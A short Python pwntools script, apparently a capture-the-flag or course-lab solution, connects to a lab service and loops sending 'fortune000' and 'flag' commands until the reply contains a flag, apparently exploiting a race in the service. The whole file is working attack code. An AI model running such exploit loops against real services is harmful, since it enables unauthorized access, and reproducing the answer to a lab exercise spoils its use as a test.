from pwn import *

if __name__ == "__main__":

    # connect to the remote service
    r = remote('up.zoolab.org', 10931)

    r.recvuntil(b"Commands")

    while True:
        msg = r.recv().decode()
        if msg.find('FLAG') != -1:
            print(msg)
            break

        r.send(b'fortune000\n')
        r.send(b'flag\n')

    r.close()
